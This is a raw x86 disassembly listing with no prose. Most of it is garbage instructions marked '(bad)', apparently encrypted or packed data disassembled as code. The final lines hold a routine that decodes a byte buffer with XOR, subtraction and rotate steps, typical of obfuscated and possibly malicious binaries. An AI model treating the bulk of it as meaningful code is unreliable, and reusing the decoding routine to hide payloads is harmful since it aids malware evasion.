  4213f1:	cld    
  4213f2:	mov    edx,0x3ffba03
  4213f7:	(bad)  
  4213f8:	std    
  4213f9:	stc    
  4213fa:	repz fst st(5)
  4213fd:	jmp    0xa441603
  421402:	(bad)  
  421404:	(bad)  
  421405:	out    0xb7,al
  421407:	mov    cl,0xd7
  421409:	into   
  42140a:	mov    cl,0xeb
  42140d:	mov    al,0xda
  42140f:	cli    
  421410:	(bad)  
  421412:	call   0x816d7cb
  421417:	ret    0xc2e5
  42141a:	not    ch
  42141c:	add    ebx,ebp
  42141e:	aam    0xdb
  421420:	into   
  421421:	fisttp WORD PTR [edx]
  421423:	or     eax,0xcbdccfc4
  421428:	(bad)  
  421429:	retf   
  42142a:	fcmovnb st,st(0)
  42142c:	in     eax,0xbb
  42142e:	dec    bl
  421430:	mov    ebp,0xcce903
  421435:	out    0xff,eax
  421437:	ret    
  421438:	mov    esp,0xc5fed8e3
  42143d:	sti    
  42143e:	cli    
  42143f:	aad    0xe5
  421441:	or     ebx,ebx
  421443:	cld    
  421444:	fsubr  st,st(1)
  421446:	loope  0x42141d
  421448:	imul   DWORD PTR [ebp-0x26244919]
  42144e:	(bad)  
  42144f:	shl    DWORD PTR [ebx-0x400c2a38],1
  421455:	aam    0xe7
  421457:	add    ah,cl
  421459:	or     esi,esi
  42145b:	icebp  
  42145c:	aad    0xc8
  42145e:	enter  0xcfe0,0xf3
  421462:	loop   0x421473
  421464:	loop   0x421426
  421466:	enter  0xc2c1,0xea
  42146a:	mov    bl,0xef
  42146c:	stc    
  42146d:	in     eax,dx
  42146e:	int    0xbf
  421470:	jmp    0x400f34c
  421475:	stc    
  421476:	xlat   BYTE PTR ds:[ebx]
  421477:	ret    
  421478:	push   es
  421479:	(bad)  
  42147a:	loope  0x421459
  42147c:	or     al,bl
  42147e:	aam    0xbc
  421480:	jmp    0x42145e
  421482:	in     eax,dx
  421483:	or     al,0xb2
  421485:	int3   
  421486:	xlat   BYTE PTR ds:[ebx]
  421487:	retf   0xe9c6
  42148a:	shl    edx,0xd8
  42148d:	cmc    
  42148e:	(bad)  
  42148f:	clc    
  421490:	aad    0xd9
  421492:	std    
  421493:	(bad)  
  421494:	add    edx,ebx
  421496:	aam    0xd7
  421498:	icebp  
  421499:	rcl    eax,cl
  42149b:	jecxz  0x4214a6
  42149d:	push   es
  42149e:	jmp    0xd94d17a5
  4214a3:	faddp  st(1),st
  4214a5:	repnz mov al,0xbc
  4214a8:	mov    al,0xb4
  4214aa:	sti    
  4214ab:	out    dx,eax
  4214ac:	in     eax,dx
  4214ad:	int3   
  4214ae:	in     eax,dx
  4214af:	enter  0xc8f4,0xf2
  4214b3:	push   ecx
  4214b5:	cli    
  4214b6:	(bad)  
  4214b7:	in     eax,dx
  4214b8:	int3   
  4214b9:	rcl    esi,1
  4214bb:	sti    
  4214bc:	add    esp,edi
  4214be:	rcr    ah,0xd5
  4214c1:	(bad)  
  4214c3:	iret   
  4214c4:	retf   
  4214c5:	lds    edi,FWORD PTR [esi-0x3b312e3a]
  4214cb:	out    dx,eax
  4214cc:	int3   
  4214cd:	int3   
  4214ce:	lods   eax,DWORD PTR ds:[esi]
  4214cf:	iret   
  4214d0:	call   ebp
  4214d2:	fcmovnbe st,st(4)
  4214d4:	ret    0xd003
  4214d7:	fnstcw WORD PTR [esi+0x8f2c2d7]
  4214dd:	mov    esi,0xfa0ce8fd
  4214e2:	fsubr  st(0),st
  4214e4:	in     al,0xec
  4214e6:	test   al,0xb3
  4214e8:	mov    bl,0xf5
  4214ea:	int3   
  4214eb:	lds    esi,FWORD PTR [edi-0x208294f]
  4214f1:	rcl    ch,1
  4214f3:	fdiv   st,st(6)
  4214f5:	fld    QWORD PTR [esi]
  4214f7:	int    0x1
  4214f9:	loopne 0x4214ff
  4214fb:	fdivr  st,st(7)
  4214fd:	std    
  4214fe:	or     edi,DWORD PTR [ebp+eiz*8-0x1322fd03]
  421505:	retf   
  421506:	test   al,0xe2
  421508:	int    0xd7
  42150a:	shr    BYTE PTR [eax-0x1617124c],1
  421510:	hlt    
  421511:	mov    ebp,0xbabcb9f7
  421516:	(bad)  
  421517:	in     al,dx
  421518:	fcmovnb st,st(5)
  42151a:	repz or bh,dh
  42151d:	fcmovnu st,st(0)
  42151f:	add    esp,ebp
  421521:	loop   0x42152d
  421523:	cld    
  421524:	(bad)  
  421525:	fidiv  WORD PTR [eax-0x2d430858]
  42152b:	mov    edx,0xcdc4e9c7
  421530:	fnstsw WORD PTR [edi-0x3f00152e]
  421536:	idiv   ah
  421538:	stc    
  421539:	ror    BYTE PTR [edx],1
  42153b:	shl    ch,0xfa
  42153e:	(bad)  
  42153f:	into   
  421540:	or     al,0xf
  421542:	repz repz in eax,dx
  421545:	enter  0xd1ea,0xc4
  421549:	repz rcl ah,1
  42154c:	xlat   BYTE PTR ds:[ebx]
  42154d:	out    dx,eax
  42154e:	repz jmp 0x42152f
  421551:	mov    dl,0xd3
  421553:	sar    BYTE PTR [ebx-0x441e2c30],1
  421559:	stc    
  42155a:	(bad)  
  42155c:	jmp    0x529fb61
  421561:	iret   
  421562:	out    dx,eax
  421563:	(bad)  
  421564:	ror    ebx,cl
  421566:	ror    edi,1
  421568:	mov    cl,0xb7
  42156a:	int3   
  42156b:	shl    DWORD PTR [ebp-0x272f211b],cl
  421571:	aam    0xf7
  421573:	(bad)  
  421575:	clc    
  421576:	rol    esi,0xbc
  421579:	add    ebx,esp
  42157b:	hlt    
  42157c:	(bad)  
  42157d:	out    0xca,eax
  42157f:	out    0xc3,eax
  421581:	or     cl,BYTE PTR [edx]
  421583:	jmp    0x421566
  421585:	fmul   st(1),st
  421587:	(bad)  
  421588:	in     eax,0xc4
  42158a:	ret    0xc1ed
  42158d:	out    0xf3,eax
  42158f:	hlt    
  421590:	sti    
  421591:	repnz sar dh,1
  421594:	(bad)  
  421596:	mov    eax,0xdcc0f4df
  42159b:	or     DWORD PTR [ecx],eax
  42159d:	cmc    
  42159e:	jmp    0x4215ae
  4215a0:	fmul   QWORD PTR [eax]
  4215a2:	in     al,0xf2
  4215a4:	mov    cl,0xe5
  4215a6:	fcomip st,st(3)
  4215a8:	(bad)  
  4215aa:	repnz (bad) 
  4215ac:	icebp  
  4215ad:	sar    DWORD PTR [edx-0x7303b0c],1
  4215b3:	mov    eax,0xdadcc8f1
  4215b8:	mov    esp,0xdac3c50b
  4215bd:	std    
  4215be:	jmp    0xe30420be
  4215c3:	in     eax,0xf2
  4215c5:	into   
  4215c6:	ror    dh,cl
  4215c8:	int3   
  4215c9:	aam    0xb5
  4215cb:	mov    bh,0xd6
  4215cd:	repz div DWORD PTR [edx+edx*8-0xe461602]
  4215d5:	fcomip st,st(2)
  4215d7:	add    dh,ah
  4215d9:	aad    0xe2
  4215db:	in     eax,0xd6
  4215dd:	aam    0xc0
  4215df:	add    dh,bh
  4215e1:	push   cs
  4215e2:	add    al,0xf
  4215e4:	int3   
  4215e5:	jmp    0xb633e3b5
  4215ea:	int    0xf0
  4215ec:	rcr    edx,0xb4
  4215ef:	(bad)  
  4215f1:	jmp    0xc0cc:0xd3e8d3c3
  4215f8:	repz clc 
  4215fa:	std    
  4215fb:	cli    
  4215fc:	(bad)  
  4215fd:	fnstcw WORD PTR [ebp-0x3726f700]
  421603:	or     eax,0xcfc0edd1
  421608:	call   0xc53cc9ed
  42160d:	in     al,dx
  42160e:	aam    0xdf
  421610:	in     al,dx
  421611:	aad    0xd4
  421613:	cli    
  421614:	in     al,dx
  421615:	(bad)  
  421617:	hlt    
  421618:	icebp  
  421619:	(bad)  
  42161a:	(bad)  
  42161c:	sti    
  42161d:	fld    QWORD PTR ds:0xe2c5cfd8
  421623:	(bad)  
  421624:	stos   DWORD PTR es:[edi],eax
  421625:	ret    0xd7f7
  421628:	mov    dl,0xd0
  42162a:	jmp    0xdbb4:0xfbefe1ef
  421631:	into   
  421632:	(bad)  
  421634:	into   
  421635:	mov    esi,0xf7c7f0ff
  42163a:	ret    
  42163b:	in     al,0x5
  42163d:	fisttp DWORD PTR [edx]
  42163f:	leave  
  421640:	in     al,0xc2
  421642:	in     eax,dx
  421643:	in     al,dx
  421644:	test   eax,0xeae9eddf
  421649:	mul    edx
  42164b:	lods   al,BYTE PTR ds:[esi]
  42164c:	call   0xe8eecc16
  421651:	std    
  421652:	repz fiadd DWORD PTR [ecx]
  421655:	iret   
  421656:	cli    
  421657:	repnz neg esi
  42165a:	mov    ecx,0xf9d403d7
  42165f:	iret   
  421660:	jmp    0xceac:0xaae105ee
  421667:	retf   
  421668:	scas   eax,DWORD PTR es:[edi]
  421669:	div    DWORD PTR [ebp-0xf103636]
  42166f:	(bad)  
  421670:	fmul   st,st(0)
  421672:	xlat   BYTE PTR ds:[ebx]
  421673:	not    cl
  421675:	int3   
  421676:	fcomp  st(0)
  421678:	loope  0x42164a
  42167a:	mov    DWORD PTR [ecx],0xc5fd06c2
  421680:	in     al,dx
  421681:	add    bl,bl
  421683:	in     eax,0xc4
  421685:	lods   al,BYTE PTR ds:[esi]
  421686:	ret    
  421687:	call   0xc71a097a
  42168c:	repz cmc 
  42168e:	shr    DWORD PTR [ebx+ebx*8-0x2a354a0d],1
  421695:	aad    0x6
  421697:	pop    es
  421698:	(bad)  
  421699:	fcom   st(2)
  42169b:	add    al,0xca
  42169d:	or     ah,al
  42169f:	fimul  WORD PTR [eax+ecx*8]
  4216a2:	or     cl,bh
  4216a4:	(bad)  
  4216a5:	leave  
  4216a6:	les    edi,FWORD PTR [esi-0x180b2e38]
  4216ac:	stc    
  4216ad:	hlt    
  4216ae:	lods   eax,DWORD PTR ds:[esi]
  4216af:	(bad)  
  4216b0:	out    dx,eax
  4216b1:	out    dx,eax
  4216b2:	(bad)  
  4216b3:	fscale 
  4216b5:	fcmove st,st(6)
  4216b7:	mov    ebp,0x907dcbe
  4216bc:	(bad)  
  4216bd:	or     ch,bl
  4216bf:	fsubrp st(0),st
  4216c1:	call   0xb3eefca6
  4216c6:	repz leave 
  4216c8:	icebp  
  4216c9:	ret    
  4216ca:	mov    ebx,0xffe0b6f6
  4216cf:	mov    eax,0xb4f6eeb8
  4216d4:	fcom   st(1)
  4216d6:	int    0xfc
  4216d8:	ret    0xd8c2
  4216db:	cld    
  4216dc:	(bad)  
  4216dd:	fild   DWORD PTR [edx]
  4216df:	lds    eax,FWORD PTR [ebx]
  4216e1:	iret   
  4216e2:	add    al,0xfa
  4216e4:	out    0xce,al
  4216e6:	(bad)  
  4216e7:	mov    bh,0xb7
  4216e9:	hlt    
  4216ea:	jmp    0x4216d8
  4216ec:	in     eax,0xb9
  4216ee:	jmp    0x4216e2
  4216f0:	out    dx,al
  4216f1:	hlt    
  4216f2:	icebp  
  4216f3:	(bad)  
  4216f5:	(bad)  
  4216f7:	in     eax,dx
  4216f8:	int3   
  4216f9:	jmp    0x4216e5
  4216fb:	push   es
  4216fc:	jecxz  0x4216e0
  4216fe:	or     DWORD PTR [esi],eax
  421700:	les    ecx,FWORD PTR [edi]
  421702:	fcmove st,st(2)
  421704:	mov    ecx,0xade9d6e5
  421709:	jecxz  0x4216d1
  42170b:	loop   0x4216ed
  42170d:	cmc    
  42170e:	int3   
  42170f:	lods   al,BYTE PTR ds:[esi]
  421710:	leave  
  421711:	iret   
  421712:	leave  
  421713:	mov    al,0xfc
  421715:	(bad)  
  421717:	sti    
  421718:	shr    bl,cl
  42171a:	ret    0xd0e3
  42171d:	add    bh,dl
  42171f:	add    bl,bl
  421721:	(bad)  
  421722:	fucomi st,st(7)
  421724:	icebp  
  421725:	repz rol ebx,0xc4
  421729:	(bad)  
  42172a:	out    0xe6,al
  42172c:	(bad)
  42172f:	out    dx,al
  421730:	mov    eax,0xdce9b4bd
  421735:	clc    
  421736:	pop    es
  421737:	mov    edi,0xd40200cd
  42173c:	(bad)  
  42173d:	neg    esp
  42173f:	shr    dh,0xe9
  421742:	int    0xde
  421744:	in     eax,dx
  421745:	faddp  st(2),st
  421747:	(bad)  
  421748:	repz aad 0xe7
  42174b:	in     al,dx
  42174c:	jmp    0x421725
  42174e:	cmc    
  42174f:	out    dx,eax
  421750:	mov    ebp,0xfa03f0d3
  421755:	(bad)  
  421757:	cli    
  421758:	cld    
  421759:	mov    esp,0xfe4d1e7
  42175e:	fild   WORD PTR [edx]
  421760:	cli    
  421761:	retf   
  421762:	stc    
  421763:	or     eax,ebx
  421765:	loop   0x42172e
  421767:	mov    cl,0xcd
  421769:	xlat   BYTE PTR ds:[ebx]
  42176a:	shr    BYTE PTR [eax+edx*8-0x4047451a],1
  421771:	int3   
  421772:	rcr    dl,cl
  421774:	mov    ebx,0xfaf4d001
  421779:	stc    
  42177a:	fcmovnu st,st(7)
  42177c:	loop   0x42177a
  42177e:	(bad)  
  42177f:	jmp    0xcab3:0xede2cccb
  421786:	out    0xcd,eax
  421788:	retf   
  421789:	call   0xcbf5ed40
  42178e:	aam    0xd5
  421790:	icebp  
  421791:	rol    DWORD PTR [edx],1
  421793:	ret    
  421794:	add    eax,eax
  421796:	cmc    
  421797:	stc    
  421798:	sti    
  421799:	fsubrp st(6),st
  42179b:	rcr    al,cl
  42179d:	or     cl,BYTE PTR [edx]
  42179f:	add    ch,dh
  4217a1:	fdivr  st,st(1)
  4217a3:	fbstp  TBYTE PTR [ecx-0x2c281b3e]
  4217a9:	in     eax,dx
  4217aa:	mov    ch,0xb5
  4217ac:	in     eax,0xf5
  4217ae:	mov    ah,0xb6
  4217b0:	mov    esi,0xbdd7f3fa
  4217b5:	pop    es
  4217b6:	fcmovbe st,st(5)
  4217b8:	mov    ebx,0xf6c5fed6
  4217bd:	jmp    0x4217c7
  4217bf:	(bad)  
  4217c1:	(bad)  
  4217c2:	fcomi  st,st(2)
  4217c4:	into   
  4217c5:	(bad)  
  4217c6:	test   ch,0xd3
  4217c9:	jmp    0xd5e9:0xcdf3b5c5
  4217d0:	fucomip st,st(3)
  4217d2:	mov    ch,0xc9
  4217d4:	fucomi st,st(6)
  4217d6:	sti    
  4217d7:	ret    0xfdc7
  4217da:	fld    DWORD PTR ds:0xc5dadaf0
  4217e0:	(bad)  
  4217e1:	or     ch,cl
  4217e3:	int    0xc9
  4217e5:	stos   BYTE PTR es:[edi],al
  4217e6:	into   
  4217e7:	loope  0x4217ae
  4217e9:	(bad)  
  4217ea:	shl    cl,cl
  4217ec:	fxch   st(5)
  4217ee:	mov    dh,0xb5
  4217f0:	(bad)  
  4217f2:	mov    cl,0xd3
  4217f4:	(bad)  
  4217f5:	(bad)  
  4217f7:	cli    
  4217f8:	xlat   BYTE PTR ds:[ebx]
  4217f9:	jecxz  0x421806
  4217fb:	cli    
  4217fc:	jecxz  0x4217c4
  4217fe:	or     bl,ch
  421800:	call   0xb90c15cd
  421805:	rcl    ebx,0xcd
  421808:	ret    
  421809:	jecxz  0x4217de
  42180b:	stc    
  42180c:	icebp  
  42180d:	mov    ebx,0xdcbbb8db
  421812:	ffree  st(3)
  421814:	fldln2 
  421816:	cld    
  421817:	out    dx,al
  421818:	(bad)
  42181b:	cld    
  42181c:	idiv   BYTE PTR [esi-0x193c031e]
  421822:	in     eax,dx
  421823:	push   es
  421824:	jmp    0xea09e411
  421829:	icebp  
  42182a:	mov    dl,0xd7
  42182c:	sti    
  42182d:	rcr    dl,1
  42182f:	repz hlt 
  421831:	icebp  
  421832:	out    dx,al
  421833:	inc    DWORD PTR [eax]
  421835:	add    dl,al
  421837:	(bad)  
  421838:	(bad)  
  42183a:	jecxz  0x42180e
  42183c:	(bad)  
  42183e:	retf   0xcfe0
  421841:	in     al,dx
  421842:	fild   DWORD PTR [ecx]
  421844:	shr    eax,cl
  421846:	out    0xd1,al
  421848:	lock iret 
  42184a:	(bad)  
  42184b:	shl    ah,1
  42184d:	cli    
  42184e:	aam    0xac
  421850:	cli    
  421851:	jecxz  0x421828
  421853:	xlat   BYTE PTR ds:[ebx]
  421854:	clc    
  421855:	fcmovnb st,st(3)
  421857:	in     eax,dx
  421858:	cmc    
  421859:	fucom  st(3)
  42185b:	fstp   st(3)
  42185d:	imul   bh
  42185f:	out    0xda,eax
  421861:	or     eax,0xd8aae7d8
  421866:	rcl    dh,1
  421868:	shl    ch,0xe0
  42186b:	lods   al,BYTE PTR ds:[esi]
  42186c:	in     al,dx
  42186d:	fcomi  st,st(0)
  42186f:	call   eax
  421871:	in     eax,dx
  421872:	fnstsw WORD PTR [edi-0x92d492d]
  421878:	loop   0x421857
  42187a:	jecxz  0x421877
  42187c:	fimul  DWORD PTR [edx]
  42187e:	ror    bh,0xec
  421881:	cld    
  421882:	jmp    0x42185c
  421884:	test   eax,0xc0cac7bc
  421889:	fsub   st(7),st
  42188b:	mov    dh,0xd9
  42188d:	jmp    0xf30ec54c
  421892:	fstp   TBYTE PTR [eax-0x2b22313e]
  421898:	mov    esi,0xdec2d1dd
  42189d:	test   esp,0xf2edc8e3
  4218a3:	adc    edx,eax
  4218a5:	shr    DWORD PTR [esi-0x29121e49],cl
  4218ab:	mov    edx,0xb0d8f5d6
  4218b0:	sti    
  4218b1:	hlt    
  4218b2:	(bad)  
  4218b3:	cli    
  4218b4:	loopne 0x421893
  4218b6:	mov    ch,0xda
  4218b8:	faddp  st(4),st
  4218ba:	stc    
  4218bb:	aam    0xd9
  4218bd:	hlt    
  4218be:	rcr    edi,0xe2
  4218c1:	clc    
  4218c2:	or     ebx,esi
  4218c4:	mov    dl,0xe8
  4218c6:	jmp    0xefc1:0xb5bcf1c2
  4218cd:	rcl    bh,cl
  4218cf:	vpor   xmm6,xmm2,xmm5
  4218d3:	repz jecxz 0x4218ce
  4218d6:	cli    
  4218d7:	shl    ecx,0xff
  4218da:	(bad)  
  4218db:	in     eax,0xcb
  4218dd:	in     al,0xc5
  4218df:	(bad)  
  4218e0:	sti    
  4218e1:	in     al,dx
  4218e2:	enter  0xc011,0xcc
  4218e6:	out    dx,al
  4218e7:	mov    esi,0xe0e2f7c0
  4218ec:	mov    cl,0xce
  4218ee:	(bad)  
  4218ef:	(bad)  
  4218f0:	repnz mov ch,0xd9
  4218f3:	(bad)  
  4218f5:	iret   
  4218f6:	sar    ah,cl
  4218f8:	frstpm(287 only) 
  4218fa:	sti    
  4218fb:	or     eax,ecx
  4218fd:	add    edi,eax
  4218ff:	or     DWORD PTR [ecx*8-0x3e37061f],eax
  421906:	(bad)  
  421907:	loopne 0x4218da
  421909:	sti    
  42190a:	ror    eax,cl
  42190c:	out    0xbb,eax
  42190e:	mov    ah,0xb8
  421910:	cmc    
  421911:	mov    dh,0xf6
  421913:	(bad)  
  421915:	mov    ecx,0xe603c1e1
  42191a:	rol    BYTE PTR [eax],0x8
  42191d:	in     al,0xfc
  42191f:	(bad)  
  421920:	or     BYTE PTR [esi],al
  421922:	retf   
  421923:	jmp    0xb4cd:0xb1e8d7af
  42192a:	jmp    0x42191c
  42192c:	rcr    bh,1
  42192e:	out    dx,al
  42192f:	lds    esi,FWORD PTR [esi+0x3d2cab6]
  421935:	fucom  st(1)
  421937:	xlat   BYTE PTR ds:[ebx]
  421938:	add    esp,ecx
  42193a:	out    0xd0,eax
  42193c:	or     edx,eax
  42193e:	jmp    0xeff9:0x90503e5
  421945:	faddp  st(3),st
  421947:	ror    edi,1
  421949:	repz mov ah,0xc7
  42194c:	mov    ch,0xd2
  42194e:	repz aam 0xf3
  421951:	aad    0xeb
  421953:	jecxz  0x421955
  421955:	inc    DWORD PTR [ebx]
  421957:	icebp  
  421958:	mov    ebp,0xdef6d401
  42195d:	(bad)  
  42195e:	wbinvd 
  421960:	fcomp  st(3)
  421962:	int3   
  421963:	int    0xc4
  421965:	(bad)
  421968:	mov    cl,0xd3
  42196a:	(bad)
  42196d:	(bad)  
  42196f:	fsubr  st,st(4)
  421971:	mov    esp,0xd4c8e1f6
  421976:	mov    ecx,0xe1c1f000
  42197b:	loope  0x42197a
  42197d:	fisttp QWORD PTR [ecx]
  42197f:	cli    
  421980:	aam    0xe4
  421982:	into   
  421983:	add    ebx,esi
  421985:	loop   0x421964
  421987:	repz neg ah
  42198a:	out    0xee,eax
  42198c:	rcl    eax,1
  42198e:	repz repz sar DWORD PTR [ecx+0xbcd0e2],1
  421996:	test   ebx,0xc6fef8d2
  42199c:	leave  
  42199d:	test   bh,0xdf
  4219a0:	fild   WORD PTR ds:0xe5bdd906
  4219a6:	xlat   BYTE PTR ds:[ebx]
  4219a7:	jmp    0xb8370a78
  4219ac:	sar    cl,1
  4219ae:	(bad)  
  4219af:	(bad)  
  4219b1:	clc    
  4219b2:	div    BYTE PTR [esi+ecx*8-0x1250b27]
  4219b9:	(bad)  
  4219ba:	(bad)
  4219bd:	or     edi,ebx
  4219bf:	(bad)  
  4219c0:	or     cl,BYTE PTR [esi]
  4219c2:	add    BYTE PTR [esi],al
  4219c4:	lds    esi,FWORD PTR [ecx-0x232e5122]
  4219ca:	jmp    0x421993
  4219cc:	mov    ah,0xd6
  4219ce:	fld    st(4)
  4219d0:	(bad)  
  4219d2:	hlt    
  4219d3:	mov    ebp,0xf4fafff4
  4219d8:	fdiv   st(6),st
  4219da:	test   DWORD PTR [eax],0xc503e2f4
  4219e0:	or     ah,dh
  4219e2:	femms  
  4219e4:	(bad)  
  4219e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219e6:	into   
  4219e7:	rol    esp,cl
  4219e9:	in     eax,0xe4
  4219eb:	fcmovnu st,st(0)
  4219ed:	shr    edx,cl
  4219ef:	jmp    0xe2f3:0xf5f4cdb6
  4219f6:	lock int3 
  4219f8:	add    ecx,eax
  4219fa:	(bad)  
  4219fc:	clc    
  4219fd:	out    0xfc,al
  4219ff:	in     eax,0x8
  421a01:	jmp    0xc6041905
  421a06:	rcl    bh,cl
  421a08:	shl    ebp,cl
  421a0a:	ret    
  421a0b:	mov    edx,0xb8adf8ee
  421a10:	mov    bh,0xbc
  421a12:	cld    
  421a13:	fistp  QWORD PTR [esi+esi*8-0x4209f924]
  421a1a:	rcr    bl,1
  421a1c:	retf   
  421a1d:	ret    0xbcd5
  421a20:	retf   0xeef8
  421a23:	adc    al,bl
  421a25:	shr    BYTE PTR [edi-0x342b3f14],0xd4
  421a2c:	cli    
  421a2d:	shl    DWORD PTR [esi-0x6443b3a],cl
  421a33:	call   0xdc3afcf2
  421a38:	faddp  st(0),st
  421a3a:	or     al,ah
  421a3c:	(bad)  
  421a3d:	(bad)  
  421a3e:	loop   0x421a27
  421a40:	stc    
  421a41:	loopne 0x421a3b
  421a43:	add    eax,0xcfdde3f2
  421a48:	int    0xe5
  421a4a:	imul   BYTE PTR [esp+esi*8-0x1147010c]
  421a51:	jmp    0x421a4e
  421a53:	loop   0x421a37
  421a55:	iret   
  421a56:	std    
  421a57:	(bad)  
  421a59:	(bad)  
  421a5a:	(bad)  
  421a5b:	faddp  st(0),st
  421a5d:	or     esp,edx
  421a5f:	push   es
  421a60:	clc    
  421a61:	std    
  421a62:	int    0x7
  421a64:	jmp    0xacbc:0xcfedecf1
  421a6b:	jmp    0xf30a025a
  421a70:	into   
  421a71:	(bad)  
  421a73:	icebp  
  421a74:	sar    DWORD PTR [esi-0x3a201efe],cl
  421a7a:	aad    0xff
  421a7c:	(bad)  
  421a7d:	or     esi,edi
  421a7f:	or     esp,esi
  421a81:	push   cs
  421a82:	in     eax,0xc
  421a84:	lods   eax,DWORD PTR ds:[esi]
  421a85:	iret   
  421a86:	in     al,dx
  421a87:	jmp    0x421a4c
  421a89:	div    dh
  421a8b:	hlt    
  421a8c:	shl    bh,0xf9
  421a8f:	(bad)  
  421a91:	test   edx,0xb5f50203
  421a97:	fld    QWORD PTR ds:0xe907e1e7
  421a9d:	add    dh,ah
  421a9f:	cld    
  421aa0:	cmc    
  421aa1:	adc    ebp,ebx
  421aa3:	or     ch,cl
  421aa5:	mov    cl,0xd1
  421aa7:	repnz shl DWORD PTR [ecx-0x270f380b],cl
  421aae:	rcr    dl,cl
  421ab0:	in     al,0xe9
  421ab2:	mov    ah,0xcc
  421ab4:	in     al,dx
  421ab5:	mov    eax,0xd9ede7fb
  421aba:	sti    
  421abb:	(bad)  
  421abc:	ret    
  421abd:	(bad)  
  421abe:	fcmovbe st,st(4)
  421ac0:	lds    ecx,FWORD PTR [edi]
  421ac2:	jmp    0xf0f2:0xb7e2bec8
  421ac9:	jmp    0xb307dcba
  421ace:	retf   0xcecb
  421ad1:	jmp    0xdbce:0xbffab8df
  421ad8:	add    al,bl
  421ada:	cld    
  421adb:	pop    es
  421adc:	icebp  
  421add:	jmp    0x421aa6
  421adf:	add    eax,ebp
  421ae1:	out    dx,eax
  421ae2:	clc    
  421ae3:	add    eax,0xccf7e5d8
  421ae8:	out    0xe4,al
  421aea:	shl    DWORD PTR [ecx-0x27390b19],cl
  421af0:	iret   
  421af1:	mov    ebp,0xddf2d2e8
  421af6:	mov    ebp,0xe6e7bdfc
  421afb:	clc    
  421afc:	leave  
  421afd:	stc    
  421afe:	(bad)  
  421b00:	fdivr  st,st(6)
  421b02:	int    0xee
  421b04:	fldl2e 
  421b06:	mov    edi,0xb3adc7d3
  421b0b:	call   0xfa1a04fc
  421b10:	fcomi  st,st(7)
  421b12:	test   dh,0xf4
  421b15:	test   BYTE PTR [eax],0xec
  421b18:	int3   
  421b19:	fadd   st(7),st
  421b1b:	add    edx,eax
  421b1d:	rol    BYTE PTR [esi+eiz*8],1
  421b20:	lar    ecx,ax
  421b23:	or     ebx,ecx
  421b25:	in     al,dx
  421b26:	in     al,dx
  421b27:	scas   al,BYTE PTR es:[edi]
  421b28:	leave  
  421b29:	div    DWORD PTR [ecx-0x14282f58]
  421b2f:	in     eax,dx
  421b30:	out    dx,al
  421b31:	clc    
  421b32:	retf   
  421b33:	imul   eax
  421b35:	mov    esi,0xbeeddbf0
  421b3a:	push   es
  421b3b:	in     al,0xe3
  421b3d:	cld    
  421b3e:	clc    
  421b3f:	add    ah,bh
  421b41:	iret   
  421b42:	std    
  421b43:	fstp   st(0)
  421b45:	int    0xbc
  421b47:	lds    esi,FWORD PTR [esi-0x4d2c0c0c]
  421b4d:	not    ecx
  421b4f:	lods   al,BYTE PTR ds:[esi]
  421b50:	int    0xf5
  421b52:	add    eax,edx
  421b54:	out    dx,al
  421b55:	mov    dh,0x7
  421b57:	shl    bh,0xf0
  421b5a:	(bad)  
  421b5b:	aam    0xd5
  421b5d:	push   es
  421b5e:	out    0xfc,eax
  421b60:	into   
  421b61:	in     al,dx
  421b62:	les    eax,FWORD PTR [esi]
  421b64:	call   0xe62cfd37
  421b69:	sti    
  421b6a:	(bad)  
  421b6c:	int3   
  421b6d:	out    dx,eax
  421b6e:	retf   
  421b6f:	fdivrp st(2),st
  421b71:	add    eax,ebx
  421b73:	fcomp  st(5)
  421b75:	iret   
  421b76:	mov    ebp,0xf5ccdfdd
  421b7b:	aam    0xdd
  421b7d:	std    
  421b7e:	aad    0xbc
  421b80:	or     al,0xec
  421b82:	repnz or dl,al
  421b85:	into   
  421b86:	repz mov esi,0xf6dbf0b0
  421b8c:	out    dx,eax
  421b8d:	(bad)  
  421b8e:	hlt    
  421b8f:	jmp    0xd9131351
  421b94:	fstp   st(0)
  421b96:	loop   0x421b7b
  421b98:	loop   0x421b93
  421b9a:	ret    0xd0f4
  421b9d:	cld    
  421b9e:	dec    BYTE PTR [edi]
  421ba0:	pop    es
  421ba1:	(bad)  
  421ba3:	loopne 0x421b93
  421ba5:	leave  
  421ba6:	enter  0xcdb6,0xbc
  421baa:	(bad)  
  421bab:	leave  
  421bac:	repnz cli 
  421bae:	mov    al,0xde
  421bb0:	fucomip st,st(7)
  421bb2:	(bad)  
  421bb3:	jecxz  0x421ba5
  421bb5:	fcomip st,st(3)
  421bb7:	cld    
  421bb8:	(bad)  
  421bba:	(bad)  
  421bbc:	jmp    0xeb3d0ab6
  421bc1:	add    dh,bl
  421bc3:	add    edi,DWORD PTR [ecx-0x2b524d09]
  421bc9:	mov    ah,0x8b
  421bcb:	test   eax,ecx
  421bcd:	(bad)  
  421bce:	(bad)  
  421bcf:	dec    DWORD PTR [ebx-0x12f7a7c]
  421bd5:	(bad)  
  421bd6:	inc    DWORD PTR ds:0x405fcdc
  421bdc:	mov    ecx,DWORD PTR [ebp-0x138]
  421be2:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  421be9:	jmp    0x421c0d
  421bee:	mov    eax,DWORD PTR [ebp-0x138]
  421bf4:	mov    eax,DWORD PTR [ebp+eax*4-0x130]
  421bfb:	sub    eax,0x250bcdc
  421c00:	mov    ecx,DWORD PTR [ebp-0x138]
  421c06:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  421c0d:	jmp    0x41d41c
  421c12:	cmp    DWORD PTR [ebp-0x140],0x0
  421c19:	jne    0x421c39
  421c1f:	movzx  eax,BYTE PTR [ebp-0x131]
  421c26:	xor    eax,0x83
  421c2b:	add    eax,0x8
  421c2e:	mov    BYTE PTR [ebp-0x131],al
  421c34:	jmp    0x421c78
  421c39:	mov    eax,DWORD PTR [ebp-0x110]
  421c3f:	xor    eax,0x75108b5
  421c44:	add    eax,0x3272fb
  421c49:	movzx  ecx,BYTE PTR [ebp-0x131]
  421c50:	sub    ecx,eax
  421c52:	mov    BYTE PTR [ebp-0x131],cl
  421c58:	mov    ecx,DWORD PTR [ebp-0x108]
  421c5e:	xor    ecx,0x75108b5
  421c64:	add    ecx,0x3272fb
  421c6a:	mov    al,BYTE PTR [ebp-0x131]
  421c70:	ror    al,cl
  421c72:	mov    BYTE PTR [ebp-0x131],al
  421c78:	xor    eax,eax
  421c7a:	mov    eax,DWORD PTR [ebp-0x8]
  421c7d:	add    eax,DWORD PTR [ebp-0x10c]
  421c83:	mov    cl,BYTE PTR [ebp-0x131]
